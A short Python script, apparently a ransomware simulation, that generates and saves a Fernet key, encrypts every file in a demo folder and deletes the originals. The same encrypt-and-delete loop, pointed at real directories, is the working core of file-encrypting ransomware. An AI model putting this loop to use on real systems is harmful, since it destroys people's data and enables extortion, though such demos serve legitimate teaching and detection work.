from cryptography.fernet import Fernet
import os, glob

# Create and store encryption key
key = Fernet.generate_key()
with open("key.key", "wb") as f:
    f.write(key)

fernet = Fernet(key)

# Folder containing files to simulate encryption
folder = "demo_files/"
os.makedirs(folder, exist_ok=True)

# Encrypt all files in folder
for filepath in glob.glob(folder + "*"):
    if filepath.endswith(".enc") or filepath.endswith("README.txt"):
        continue
    with open(filepath, "rb") as f:
        data = f.read()
    encrypted = fernet.encrypt(data)
    with open(filepath + ".enc", "wb") as f:
        f.write(encrypted)
    os.remove(filepath)

